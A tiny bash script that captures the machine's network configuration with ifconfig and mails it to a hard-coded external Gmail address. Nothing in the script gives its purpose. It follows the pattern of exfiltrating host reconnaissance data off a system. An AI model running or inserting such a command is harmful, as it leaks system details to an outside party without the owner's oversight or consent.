#!/bin/bash

# Get network information
shell2=$(ifconfig)

# Send email
mail -s "$shell2" robasahmedshah@gmail.com

